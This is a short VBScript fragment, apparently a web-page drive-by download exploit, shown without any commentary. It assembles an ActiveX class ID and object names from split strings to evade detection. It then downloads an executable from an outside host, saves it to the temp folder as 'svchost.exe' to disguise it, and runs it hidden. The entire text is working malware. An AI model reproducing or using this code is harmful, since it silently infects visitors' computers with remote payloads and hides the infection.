    on error resume next
    dl = "http://www.ahaoz.com/1.exe"
    j1="clsid:"
    j2="BD96C556-"
    j3="65A3-"
    j4="11D0-"
    j5="983A-"
    j6="00C04FC29E36"
    j7=j1&j2&j3&j4&j5&j6
    Set df = document.createElement("object")
    df.setAttribute "classid", j7
    b4="Mi"
    b5="cr"
    b6="o"
    b7="soft"
    b8=".X"
    b9="M"
    b10="L"
    b11="H"
    b12="T"
    b13="T"
    b14="P"
    strb=b4&b5&b6&b7&b8&b9&b10&b11&b12&b13&b14
    Set x = df.CreateObject(strb,"")
    a4="A"
    a5="d"
    a6="o"
    a7="d"
    a8="b"
    a9="."
    a10="S"
    a11="t"
    a12="r"
    a13="e"
    a14="a"
    a15="m"
    strd=a4&a5&a6&a7&a8&a9&a10&a11&a12&a13&a14&a15
    set SS = df.createobject(strd,"")
    SS.type = 1
    f4="G"
    f5="E"
    f6="T"
    stre=f4&f5&f6
    x.Open stre, dl, False
    x.Send
    fname1="svchost.exe"
    set F = df.createobject("Scripting.FileSystemObject","")
    tmp2=2
    set tmp = F.GetSpecialFolder(tmp2)
    SS.open
    fname1= F.BuildPath(tmp,fname1)
    SS.write x.responseBody
    SS.savetofile fname1,2
    SS.close
    z1="She"
    z2="ll.A"
    z3="ppli"
    z4="cat"
    z5="io"
    z6="n"
    zz=z1&z2&z3&z4&z5&z6
    set Q = df.createobject(zz,"")
    Q.ShellExecute fname1,"","","open",0

